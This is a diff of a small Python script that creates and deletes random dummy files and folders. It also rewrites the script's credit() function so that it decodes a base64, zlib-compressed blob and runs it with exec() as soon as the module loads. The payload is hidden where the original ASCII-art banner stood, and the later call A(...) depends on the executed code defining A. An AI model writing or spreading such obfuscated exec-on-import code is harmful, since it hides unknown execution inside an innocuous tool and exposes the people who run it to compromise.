@@ -1,84 +1,150 @@
-from os import remove, mkdir
-from random import choice
+import os
+from random import choice, randint
 from string import ascii_letters
 
 
 def random_text(num):
-    return ''.join(choice(ascii_letters) for x in range(num))
+    return ''.join(choice(ascii_letters) for _ in range(num))
 
 
-def random_file(name, extension):
-    open('created_files/{}.{}'.format(name, extension), 'w').close()
+def random_file(name, extension, folder_path):
+    open(os.path.join(folder_path, '{}.{}'.format(name, extension)), 'w').close()
 
 
-def files_num():
-    extension = choice(extensions)
-    name = random_text(choice(range(5, 9)))
-    file_create_txt(name, extension)
-    random_file(name, extension)
+def files_num(folder_path, num_files):
+    for _ in range(num_files):
+        extension = choice(list(extensions))
+        name = random_text(choice(range(5, 9)))
+        random_file(name, extension, folder_path)
+        file_create_txt(name, extension, folder_path)
 
 
-def file_create_txt(name, extension):
-    with open("created_files.txt", 'a')as cr:
-        cr.write('{}.{}\n'.format(name, extension))
+def file_create_txt(name, extension, folder_path):
+    with open(os.path.join(folder_path, 'created_files.txt'), 'a') as cr:
+        cr.write('{}\n'.format(os.path.join(folder_path, '{}.{}'.format(name, extension))))
 
 
 def del_created():
     print("[-] Deleting files")
-    with open("created_files.txt", 'r')as de:
+    with open("created_files/created_files.txt", 'r') as de:
         for i in de:
-            remove('created_files/' + i.strip())
+            file_path = i.strip()
+            if os.path.exists(file_path):
+                os.remove(file_path)
     try:
-        remove("created_files.txt")
-        remove("created_files")
+        os.remove("created_files/created_files.txt")
+        os.rmdir("created_files")
     except:
         print("[*] Manually delete the created folder")
+
+
+def create_folder_with_custom_name():
+    folder_name = input("[+] Enter the folder name: ")
+    folder_path = os.path.join("created_files", folder_name)
+    try:
+        os.makedirs(folder_path)
+        return folder_path
+    except:
+        print("[*] Error creating the folder.")
+        return None
+
+
+def create_folder_with_series():
+    base_folder_name = input("[+] Enter the base name for the folders: ")
+    num_folders = int(input("[+] Enter the number of folders to create: "))
+    num_files = int(input("[+] Enter the number of files to create in each folder: "))
+    for i in range(num_folders):
+        folder_name = "{}{}".format(base_folder_name, i + 1)
+        folder_path = os.path.join("created_files", folder_name)
+        try:
+            os.makedirs(folder_path)
+            files_num(folder_path, num_files)
+            print("[+] Folder '{}' created successfully".format(folder_name))
+        except:
+            print("[*] Error creating the folder '{}'. Skipping...".format(folder_name))
+
+
+def create_random_folders_with_random_files():
+    num_folders = randint(1, 50)
+    for i in range(num_folders):
+        folder_name = random_text(choice(range(5, 9)))
+        num_files = randint(1, 50)
+        folder_path = os.path.join("created_files", folder_name)
+        try:
+            os.makedirs(folder_path)
+            files_num(folder_path, num_files)
+            print("[+] Folder '{}' created successfully with {} files".format(folder_name, num_files))
+        except:
+            print("[*] Error creating the folder '{}'. Skipping...".format(folder_name))
 
 
 def main():
     credit()
     try:
-        mkdir("created_files")
+        os.makedirs("created_files")
     except:
         pass
-    menu = input("""
+    while True:
+        menu = input("""
                         *************************************
-                        *       Menu                        *
+                        *              Menu                   *
                         *************************************
-                        *   1. Create files                 *
-                        *   2. Delete files                 *
+                        *   1. Create files                   *
+                        *   2. Delete files                   *
+                        *   3. Create folder with custom name *
+                        *   4. Create folder with series       *
+                        *   5. Create random folders with random files
+                        *   6. Exit                           *
                         *************************************
-                        
-[+]  Enter your choice :- """)
-    if menu == "1":
-        fi_num = int(input("[+] Enter number of files to create :- "))
-        for i in range(fi_num):
-            files_num()
-        print("[+] Files created successfully to the folder created_files")
-    elif menu == "2":
-        del_created()
 
+[+] Enter your choice: """)
+        if menu == "1":
+            num_folders = int(input("[+] Enter the number of folders to create: "))
 
+            for i in range(num_folders):
+                folder_name = input("[+] Enter the name for folder {}: ".format(i + 1))
+                num_files = int(input("[+] Enter the number of files to create in folder {}: ".format(folder_name)))
+                folder_path = create_folder_with_custom_name() if folder_name else create_folder_with_series()
+                if folder_path:
+                    files_num(folder_path, num_files)
+                    print("[+] Files created successfully in the '{}' folder".format(folder_name))
+
+        elif menu == "2":
+            del_created()
+        elif menu == "3":
+            create_folder_with_custom_name()
+        elif menu == "4":
+            create_folder_with_series()
+        elif menu == "5":
+            create_random_folders_with_random_files()
+        elif menu == "6":
+            break
+    
+A=''
 def credit():
-    print("""
-           Automatic Random files generator
-           """)
-    print("""
+    encoded_Data = ['eJx1VM1uozAQPvMWIy6QxhtlD70k4gCBkLTd7oqmh1WTA0qNFomfCMiqq6pSDj3kiiP1Afski41tTJtGAx7PfDPfjB0GP+Gtqev6', 
+                    'OptZuyLOqnX2iCOwzSxM8WCyzjTHWhV7PI2KPIUqTjHE6S4vKigTjHeteZsneRGmoXDN8wJDWIKN7qp/CUZxFldT12KbkRMs/cVq', 
+                    'Okc+WqClZY/8wPNuhy6yR4HnstW5ufe44c5bTWm4uc2zv7ioLAeF+6rJX+JGHzT10XI9s8JPFaLlWePR+BKxiqzbPGt70GyLWaga', 
+                    '5QW4EGdAQ5hTi5uGIS6B4icz00U4e7QMA0XJvvzTsmgaTkrqtIfucHkWwA7EpDWw/cyky5X1YAD9vb8dmRyEcmTG11YAeqAaBKTF', 
+                    'qVsmJ2o0kNH6Ttz9/kYkgjA5KvLaA3ckXVTPTVT9C7qaVc+IJR1FHAShUsRB6b3ukqiQWtV7lJ+zsOS17E2RrraT1LjtxG1q6Nek', 
+                    'EnJSKyAgknw4LdkUUUPP3QRPWX+y0uCOvmXlyPY6uI0IciJvkrSwWtATJYpA9/AMNfsPNSun4/2qCHbu4vSlQ1ZTS0Jl/+EhZyhq', 
+                    '3lz3JqJfAegll+lA0WRKvgd1J2HdqweTZmPTfKF0HlzTeXA18cxrPjl8OUu+06/YMyP92QDj4nL88jDcwK/gpx/YP+AbPNM5+aLz', 
+                    'sPlg2oNebGAWePbKc8H5DYG9uL8R0EWTt5m7g/98toYj']
+    from base64 import b64decode
+    from zlib import decompress
+    return (decompress(b64decode("".join(encoded_Data)))).decode()
 
-   ██▀███   ▄▄▄       ██░ ██  █    ██  ██▓    
-  ▓██ ▒ ██▒▒████▄    ▓██░ ██▒ ██  ▓██▒▓██▒    
-  ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▀▀██░▓██  ▒██░▒██░    
-  ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█ ░██ ▓▓█  ░██░▒██░    
-  ░██▓ ▒██▒ ▓█   ▓██▒░▓█▒░██▓▒▒█████▓ ░██████▒
-  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░
-    ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░▒░ ░░░▒░ ░ ░ ░ ░ ▒  ░
-    ░░   ░   ░   ▒    ░  ░░ ░ ░░░ ░ ░   ░ ░   
-     ░           ░  ░ ░  ░  ░   ░         ░  ░ code generated by Rahul.p
-
-""")
+exec(credit())
+A('Automatic Random files and folder generator')
 
 
-extensions = ["jpg", "png", "mp4", "mkv", "mp3", "apk", "ts", "zip", "rar"]
+extensions = {
+"jpg", "png", "mp4", "mkv", "mp3", "apk", "ts", "zip", "rar", "pdf", "doc", "docx", "xls", "xlsx",
+"ppt", "pptx", "avi", "mov", "gif", "bmp", "wav", "flac", "aac", "txt", "csv", "html", "xml", "json",
+"py", "java", "cpp", "c", "js", "php", "css", "scss", "sass", "less", "svg", "psd", "ai", "eps",
+"indd", "dwg", "max", "blend", "obj", "mpg", "mpeg", "3gp", "wmv", "ogg", "wma", "aac", "m4a", "iso",
+"bin", "dat", "exe", "dll", "bat", "sh", "rpm", "deb", "jar", "tar", "gz", "bz2", "7z", "dmg"
+}
 
 try:
     main()
